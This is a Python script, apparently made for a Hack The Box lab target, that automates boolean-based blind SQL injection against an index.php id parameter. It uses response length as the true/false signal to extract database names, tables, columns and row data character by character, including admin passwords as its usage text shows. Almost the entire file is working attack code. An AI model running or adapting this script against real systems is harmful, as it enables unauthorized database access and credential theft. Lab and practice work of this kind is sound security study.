#!/usr/bin/python

import requests
import string
import warnings
import sys

def BlindSQL(sqli):
    url = "https://www.nestedflanders.htb/index.php?id="
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
    req = requests.get(url + sqli, proxies=proxies, verify=False)
    if req.headers['Content-Length'] == '1227':
        return True

def get_db_data(data_type):
    chars = string.ascii_lowercase
    chars += string.ascii_uppercase
    chars += "@_/.-$"
    output = ""
    nohit = ""

    for i in range(1,30):
        if nohit == " ":
            break

        for c in chars:
            sqli = "465' and (select ascii(substr((select {}()),{},1)))={}-- -".format(data_type, str(i), ord(c))
            if BlindSQL(sqli):
                output += c
                print("\r%s: "%(data_type) + output, end="")
                break
            
            if c == chars[len(chars)-1]:
                nohit += " "
    return output

def enum_db_data():
    warnings.simplefilter('ignore')

    chars = string.ascii_lowercase
    chars += string.digits
    # chars += "."
    chars += string.ascii_uppercase
    chars += string.punctuation
    output_list = []

    for j in range(0,10):
        nohit = ""
        output = ""

        for i in range(1,50):
            if nohit == " ":
                print("")
                output_list.append(output)
                break
            
            for c in chars:

                if len(sys.argv) == 1:
                    payload = 'SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=(select database())'

                elif len(sys.argv) == 2 and sys.argv[1] != '-h':
                    table_name = sys.argv[1]
                    payload = 'select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME="{}" and table_schema=(select database())'.format(table_name)

                elif len(sys.argv) == 3:
                    table_name = sys.argv[1]
                    column_name = sys.argv[2]
                    payload = 'select {} from {}'.format(column_name, table_name)

                elif len(sys.argv) == 4:
                    table_name = sys.argv[1]
                    column_name = sys.argv[2]
                    where_str = sys.argv[3]
                    payload = 'select {} from {} where {}'.format(column_name, table_name, where_str)

                else:
                    help()

                sqli = "465' and (select ascii(substr(({} LIMIT {},1),{},1)))={}-- -".format(payload, str(j), str(i), ord(c))

                if BlindSQL(sqli):
                    output += c
                    print("\r" + output,end="")
                    break
                
                if c == chars[len(chars)-1]:
                    nohit += " "
    
        print(output_list)

def help():
    print('[+] Usage:')
    print('  1. To enum dbuser, dbname and table_name')
    print('    python %s'%sys.argv[0])
    print('  2. To enum column_name')
    print('    python %s table_name'%sys.argv[0])
    print('  3. To enum column data')
    print('    python %s table_name column_name'%sys.argv[0])
    print('  4. To enum column data with where')
    print('    python %s table_name column_name where_str'%sys.argv[0])
    print('    example: python %s users password "username = \'admin\'"'%sys.argv[0])
    exit(0)

def main():


    
    if len(sys.argv) > 1:
        if sys.argv[1] == '-h':
            help()

    if len(sys.argv) > 1:
        if len(sys.argv) == 2 and sys.argv[1] != '-h':
            print('[+] Enumerating COLUMN_NAME...')
            enum_db_data()

        elif len(sys.argv) == 3:
            print('[+] Enumerating column data...')
            enum_db_data()

        elif len(sys.argv) == 4:
            print('[+] Enumerating column data with where string...')
            enum_db_data()
        else:
            help()

    else:
        # print('[+] Enumerating dbuser...')
        # dbuser = get_db_data('current_user')
        # print("")
        # print('[+] Enumerating dbname...')
        # dbname = get_db_data('database')
        # print("")
        print('[+] Enumerating table_names...')
        enum_db_data()
        print("")
        
if __name__ == "__main__":
    main()